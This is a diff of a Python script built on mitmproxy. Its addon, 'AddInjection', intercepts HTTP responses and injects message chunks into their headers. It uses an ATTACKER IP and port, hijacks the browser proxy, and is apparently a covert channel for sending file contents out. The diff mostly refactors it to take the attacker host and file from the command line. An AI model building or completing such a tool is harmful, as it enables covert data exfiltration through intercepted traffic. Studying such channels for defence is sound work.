@@ -3,7 +3,8 @@ from mitmproxy.options import Options
 from mitmproxy.tools.dump import DumpMaster
 from mitmproxy import http
 import proxybrowser as browser
-from random import randint      
+from random import randint   
+from sys import argv   
 
 class AddInjection(object):
     """MiTMProxy addon that injects a message into the header of a response packet."""
@@ -23,6 +24,7 @@ class AddInjection(object):
             print("[*] Stopping Proxy...")
             self.proxy.shutdown()
             return
+            
         if i%2 and (self.index <= len(self.message)):
             # intercept packet
             flow.intercept()
@@ -52,10 +54,8 @@ def config_proxy()->DumpMaster:
     server = DumpMaster(opts)
     return server
 
-
-
-def piggybackStorage(ip:str,port:int,fp:str)->None:
-    ATTACKER = ip #comes from console
+def main(ip:str,port:int,fp:str)->None:
+    ATTACKER = ip 
     ATTACKER_PORT = port
 
     input = []
@@ -73,13 +73,14 @@ def piggybackStorage(ip:str,port:int,fp:str)->None:
     prox = config_proxy()
     prox.addons.add(AddInjection(prox,input,ATTACKER,ATTACKER_PORT))
     browser.set()
-    # start proxying!
 
+    # start proxying!
     print("[!] Starting Proxy")
     prox.run()
     print("[!] Proxy Stopped")
     browser.release()
 
+    return
 if __name__ == "__main__":
-    piggybackStorage('127.0.0.1',8081,'rainbow.png')
-   
+    ip,port,fp = argv[1:]
+    main(ip,int(port),fp)
